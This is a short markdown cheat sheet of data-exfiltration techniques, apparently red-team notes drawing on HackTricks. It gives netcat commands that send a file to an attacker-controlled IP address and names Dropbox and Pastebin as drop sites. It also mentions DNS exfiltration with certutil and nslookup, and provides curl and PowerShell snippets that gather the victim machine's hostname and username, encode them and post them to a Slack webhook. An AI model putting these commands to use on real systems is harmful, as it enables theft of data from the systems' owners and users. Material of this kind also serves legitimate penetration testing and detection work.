# Exfiltration

## Web

- [Dropbox](https://www.dropbox.com/home)
- [Pastebin](https://pastebin.com)
- ...

## nc

```batch
nc -lvnp 4444 > new_file
nc -vn IP_ADDRESS 4444 < exfil_file
```

## Powershell DNS

```bash
certutil
nslookup ...
```

## Protocol Abuse

SMB/FTP/SSH/SCP/SFTP

## Slack Webhooks

### Slack Webhooks - Curl

```batch
set data=This is posted to #server and comes from a bot named webhookbot.
set channel=server
set username=webhookbot
curl -X POST --data-urlencode "payload={\"channel\": \"#%channel%\", \"username\": \"%username%\", \"text\": \"%data%\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/TOKEN
```

### Slack Webhooks - Powershell - Invoke-RestMethod

```powershell
$msg = "Hostname: ${env:computername}`nUsername: ${env:username}"
$msgEnc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($msg))

$body= ConvertTo-Json @{
username = "Testbot"
pretext = "Automated Alert"
text = $msgEnc
icon_emoji="ghost"
}

Invoke-RestMethod https://hooks.slack.com/services/TOKEN -Method Post -Body $body -ContentType 'application/json'
```

## Sources

- <https://www.youtube.com/watch?v=1w0btuMAvZk>
- <https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration>
